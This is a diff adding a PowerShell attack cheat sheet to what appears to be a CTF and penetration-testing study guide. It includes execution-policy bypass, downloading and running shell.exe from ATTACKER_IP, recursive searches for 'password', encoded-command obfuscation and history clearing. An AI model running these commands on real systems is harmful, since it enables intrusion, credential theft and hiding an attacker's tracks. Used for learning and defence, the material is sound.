@@ -262,6 +262,165 @@ exit
 
 ---
 
+# 🛡️ Advancce Powershell Commands 
+
+
+## 📌 EXECUTION POLICY (Bypass Restrictions)
+
+```bash
+Get-ExecutionPolicy
+Set-ExecutionPolicy Bypass -Scope Process
+```
+
+---
+
+## 📌 FILE DOWNLOAD (Payload Delivery)
+
+```bash
+Invoke-WebRequest -Uri "http://ATTACKER_IP/file.exe" -OutFile "file.exe"
+```
+
+Alternative:
+```bash
+iwr http://ATTACKER_IP/file.exe -OutFile file.exe
+```
+
+---
+
+## 📌 ENUMERATION – SYSTEM INFO
+
+```bash
+systeminfo
+Get-ComputerInfo
+hostname
+whoami
+```
+
+---
+
+## 📌 ENUMERATION – USERS & PRIVILEGES
+
+```bash
+net user
+net user username
+whoami /priv
+whoami /groups
+```
+
+---
+
+## 📌 PROCESS ENUMERATION
+
+```bash
+Get-Process
+tasklist
+Stop-Process -Name notepad
+```
+
+---
+
+## 📌 SERVICE ENUMERATION
+
+```bash
+Get-Service
+Get-Service | Where-Object {$_.Status -eq "Running"}
+Start-Service servicename
+Stop-Service servicename
+```
+
+---
+
+## 📌 NETWORK ENUMERATION
+
+```bash
+ipconfig
+ipconfig /all
+netstat -ano
+```
+
+---
+
+## 📌 FILE & DIRECTORY ENUMERATION
+
+```bash
+Get-ChildItem
+Get-ChildItem -Force
+Get-ChildItem -Recurse
+```
+
+---
+
+## 📌 SEARCHING FOR SENSITIVE DATA
+
+```bash
+Select-String "password" file.txt
+Get-ChildItem -Recurse | Select-String "password"
+```
+
+---
+
+## 📌 COMMAND EXECUTION (Run Programs)
+
+```bash
+Start-Process notepad.exe
+Start-Process cmd.exe
+```
+
+---
+
+## 📌 REMOTE COMMAND EXECUTION
+
+```bash
+Invoke-Command -ScriptBlock {whoami}
+```
+
+---
+
+## 📌 DOWNLOADING & EXECUTING (COMMON TECHNIQUE)
+
+```bash
+Invoke-WebRequest "http://ATTACKER_IP/shell.exe" -OutFile "shell.exe"
+Start-Process shell.exe
+```
+
+---
+
+## 📌 ENCODED COMMANDS (OBFUSCATION BASICS)
+
+```bash
+powershell.exe -EncodedCommand <Base64String>
+```
+
+---
+
+## 📌 HISTORY & CLEANUP
+
+```bash
+Get-History
+Clear-History
+```
+
+---
+
+## 📌 USEFUL ALIASES
+
+```bash
+ls      # Get-ChildItem
+cat     # Get-Content
+pwd     # Get-Location
+```
+
+---
+
+## 📌 NOTES
+
+- These commands are commonly used in PowerShell-based attacks and enumeration
+- Frequently used in CTFs and penetration testing labs
+- Understanding them helps in both Red Team and Blue Team scenarios
+
+---
+
+
 ## 🎯 Key Takeaways
 
 - PowerShell is powerful for **system enumeration**
